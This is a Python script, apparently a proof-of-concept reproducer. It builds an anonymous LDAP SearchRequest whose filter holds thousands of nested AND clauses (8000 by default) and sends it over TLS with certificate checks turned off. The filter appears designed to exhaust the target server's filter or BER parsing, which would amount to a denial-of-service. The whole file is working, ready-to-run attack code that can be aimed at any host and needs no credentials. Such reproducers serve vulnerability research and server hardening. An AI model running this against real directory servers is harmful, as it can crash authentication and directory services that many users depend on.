#!/usr/bin/env python3
"""Send an anonymous LDAP SearchRequest with a deeply nested AND filter."""

import argparse
import socket
import ssl
import sys

DEFAULT_MAX_BER_SIZE = 32_768


def ber_len(length: int) -> bytes:
    if length < 0:
        raise ValueError("BER length cannot be negative")
    if length < 0x80:
        return bytes([length])

    length_bytes = length.to_bytes((length.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(length_bytes)]) + length_bytes


def tlv(tag: int, value: bytes) -> bytes:
    if not 0 <= tag <= 0xFF:
        raise ValueError("BER tag must fit in one byte")
    return bytes([tag]) + ber_len(len(value)) + value


def build_nested_and_filter(depth: int, attr: str, value: str) -> bytes:
    if depth < 0:
        raise ValueError("filter depth cannot be negative")

    attr_bytes = attr.encode("utf-8")
    value_bytes = value.encode("utf-8")

    # equalityMatch [3] AttributeValueAssertion, implicitly tagged.
    ldap_filter = tlv(0xA3, tlv(0x04, attr_bytes) + tlv(0x04, value_bytes))

    for _ in range(depth):
        # and [0] SET OF Filter, with one child filter.
        ldap_filter = tlv(0xA0, ldap_filter)

    return ldap_filter


def build_search_request(
    *,
    message_id: int,
    base_object: str,
    depth: int,
    attr: str,
    value: str,
) -> bytes:

    search_filter = build_nested_and_filter(depth, attr, value)
    search_request = b"".join(
        (
            tlv(0x04, base_object.encode("utf-8")),  # baseObject
            tlv(0x0A, b"\x02"),  # scope: wholeSubtree
            tlv(0x0A, b"\x00"),  # derefAliases: neverDerefAliases
            tlv(0x02, b"\x00"),  # sizeLimit: 0
            tlv(0x02, b"\x00"),  # timeLimit: 0
            tlv(0x01, b"\x00"),  # typesOnly: false
            search_filter,
            tlv(0x30, b""),  # attributes: empty sequence
        )
    )

    ldap_message = tlv(
        0x30,
        tlv(0x02, bytes([message_id])) + tlv(0x63, search_request),
    )
    return ldap_message


def connect(host: str, port: int, use_tls: bool, timeout: float) -> socket.socket:
    raw_sock = socket.create_connection((host, port), timeout=timeout)
    raw_sock.settimeout(timeout)

    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    return context.wrap_socket(raw_sock, server_hostname=host)


def receive_response(sock: socket.socket) -> bytes:
    sock.settimeout(5)
    chunks: list[bytes] = []

    while True:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            break

        if not chunk:
            break

        chunks.append(chunk)

        if sum(len(part) for part in chunks) >= 4096:
            break

    return b"".join(chunks)


DEFAULT_NEST = 8000


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Reproduce an anonymous LDAP nested-AND SearchRequest over direct TLS.",
    )
    parser.add_argument("--host", default="localhost", help="LDAP server hostname")
    parser.add_argument("--port", type=int, default=3636, help="LDAP server port")
    parser.add_argument(
        "--depth",
        type=int,
        default=DEFAULT_NEST,
        help=f"number of nested AND filters, defaults to {DEFAULT_NEST}",
    )
    parser.add_argument(
        "--base", default="dc=localhost", help="SearchRequest baseObject"
    )
    parser.add_argument("--attr", default="cn", help="equalityMatch attribute")
    parser.add_argument("--value", default="x", help="equalityMatch assertion value")

    parser.add_argument(
        "--max-ber-size",
        type=int,
        default=DEFAULT_MAX_BER_SIZE,
        help="warn if the generated LDAPMessage exceeds this size",
    )

    return parser.parse_args()


def main() -> int:
    args = parse_args()

    packet = build_search_request(
        message_id=2,  # arbitrary message ID
        base_object=args.base,
        depth=args.depth,
        attr=args.attr,
        value=args.value,
    )

    print(f"LDAPMessage bytes: {len(packet)}")
    print(f"nested AND depth: {args.depth}")
    if len(packet) > args.max_ber_size:
        print(
            f"warning: packet exceeds max BER size {args.max_ber_size}",
            file=sys.stderr,
        )
    else:
        print(f"packet is under max BER size {args.max_ber_size}")

    try:
        with connect(
            args.host,
            args.port,
            use_tls=True,
            timeout=5,
        ) as sock:
            sock.sendall(packet)
            print("sent request")

            response = receive_response(sock)
            if response:
                print(f"received {len(response)} response bytes")
                print(f"response head: {response[:64].hex(' ')}")
            else:
                print("no response before close/timeout")
    except OSError as err:
        print(f"connection failed: {err}", file=sys.stderr)
        return 2

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
